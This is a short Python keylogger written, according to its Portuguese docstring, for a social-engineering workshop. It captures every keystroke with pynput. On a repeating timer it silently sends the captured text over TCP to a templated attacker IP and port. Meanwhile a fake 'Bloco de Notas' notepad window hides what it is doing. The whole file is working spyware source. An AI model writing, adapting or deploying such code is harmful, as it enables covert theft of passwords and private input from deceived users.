"""
Código desenvolvido por Thiago Felipe Alves do Carmo para oficina de apresentação de Raspberry Pi e Engenharia Social do projeto METIS
"""
import tkinter as tk
import threading
import json, socket
from pynput import keyboard

text = ""
IP = "{{IP}}"
PORT = int("{{PORT}}")
INTERVAL = int("{{INTERVAL}}")

def send_post_req():
    global text
    try:
        payload = json.dumps({"keyboardData": text})
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((IP, PORT))
            s.sendall(payload.encode())
        text = ""
    except Exception as e:
        pass  # silencioso
    finally:
        threading.Timer(INTERVAL, send_post_req).start()

def on_press(key):
    global text
    try:
        text += key.char + " "
    except AttributeError:
        text += str(key) + " "

def start_keylogger():
    send_post_req()
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

def show_fake_app():
    root = tk.Tk()
    root.title("Bloco de Notas")
    root.geometry("600x400")
    text_area = tk.Text(root, font=("Arial", 12))
    text_area.pack(expand=True, fill='both')
    text_area.insert("1.0", "Notas pessoais...\n")
    root.mainloop()

def main():
    threading.Thread(target=start_keylogger, daemon=True).start()
    show_fake_app()

if __name__ == "__main__":
    main()
